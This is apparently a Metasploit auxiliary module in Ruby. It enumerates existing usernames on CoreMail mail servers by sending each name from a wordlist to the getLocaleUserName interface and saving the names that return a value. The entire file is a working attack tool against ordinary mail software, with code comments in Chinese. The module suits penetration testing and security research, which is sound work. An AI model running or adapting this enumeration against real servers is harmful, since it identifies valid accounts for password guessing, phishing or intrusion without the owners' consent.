##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Post::File

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'CoreMail User Enumerate',
      'Description'    => %q{
        Through the coremail interface, Enumerate exist username.
      },
      'Author'       => 'AnonySec@DropLab',
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        # 默认发送https
        OptString.new('RPORT', [false, 'The target port (TCP)', '443']),
        OptString.new('SSL', [false, 'Negotiate SSL/TLS for outgoing connections', 'true']),
        OptString.new('TARGETURI', [true, 'The base path', '/']),
        OptPath.new('USER_FILE',  [ true, "File containing users, one per line"
          ]),
      ])
  end

  # host为ip发送http请求，存在误报
  # def run_host(ip)

  # run 不能 set rhosts file:/xx
  def run
    uri = target_uri.path

    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(uri, '/coremail/s?func=user:getLocaleUserName')
      })

    if res.code.to_s == '200'
      print_status("Exist username interface, start enumerating ...")
      #  数组：用户名行分割
      queue = []
      File.open(datastore['USER_FILE']).each_line do |users|
        queue << users.strip
      end
      # print_status ("#{queue}")
      
      # 输出文件格式
      outfile = store_loot(
        "CoreMailUser",
        "text/plain",
        rhost,
        ""
      )

      while(not queue.empty?)
        # 删除并获取数组第一个元素
        user = queue.shift
        # print_status ("#{user}")
        data = {"email":"#{user}"}
        # 转换json
        post_data = data.to_json
        res = send_request_cgi({
          'method'   => 'POST',
          'uri'      => normalize_uri(uri, '/coremail/s?func=user:getLocaleUserName'),
          # 'uri'      => '/coremail/s?func=user:getLocaleUserName',
          'ctype'    => 'text/x-json',
          'data'     => post_data
        })
        
        # 解析xml
        xml = res.get_xml_document
        # at查找string元素
        string = xml.at('string')
        # text方法也可以被用作去除所有HTML标签
        text = string.text
        # print_status ("#{text}")
        if not text.empty?
          print_good ("#{user} : #{text}")
          # 存在用户写入文件
          output = file_local_write( outfile ,"#{user} : #{text}")
        end
      end

      print_status ("OutFile: #{outfile}")
    else
      print_error("Exist not username interface")
    end
  end
end